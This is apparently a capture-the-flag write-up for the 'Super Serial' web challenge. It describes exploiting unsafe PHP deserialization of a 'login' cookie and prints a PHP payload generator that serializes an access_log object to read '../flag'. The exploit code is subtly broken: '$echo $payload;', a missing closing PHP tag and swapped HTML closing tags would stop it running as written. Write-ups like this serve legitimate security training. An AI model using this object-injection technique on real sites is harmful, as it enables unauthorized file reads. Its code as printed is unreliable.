# Super Serial

## Analysis

We are faced with a simple login form, which does not allow any basic login attempts.
The server also contains a ``robots.txt`` which indicates that the server reveals the content of php files via the ``phps`` extensions.
This could be verified by accessing ```/index.phps```.
It gives access to the PHP code used by the server.
The server makes use of PHP serialization (in ``cookies.php``) which might be vulnerable to several attacks.
Moreover, the file `authentication.php` contains a class (`access_log`) which accesses files on the file system upon calling `__toString()`.

## Solution

The server checks if the user provided a cookie name `login`.
If this cookie is provided, its content is url decoded, base64 decoded and finally deserialized.
If the deserialization files or if the deserialized object does not have the methods `is_guest` or `is_admin`, the `__toString()` method of the deserialized object will be called in the catch logic.
Hence, if we craft a `access_log` which points to the relative flag location `../flag`.
We finally serialize, base64 encode and url encode this object and provide it in the `login` cookie.
To do so, the following PHP code was used to create the malicious cookie:

```php
<!DOCTYPE html>
<html>
<body>

<?php
class access_log
{
    public $log_file;

    function __construct($lf) {
        $this->log_file = $lf;
    }

    function __toString() {
        return $this->read_log();
    }

    function append_to_log($data) {
        file_put_contents($this->log_file, $data, FILE_APPEND);
    }

    function read_log() {
        return file_get_contents($this->log_file);
    }
}

$ob = new access_log("../flag");
$payload = urlencode(base64_encode(serialize($ob)));
$echo $payload;

</html>
</body>
```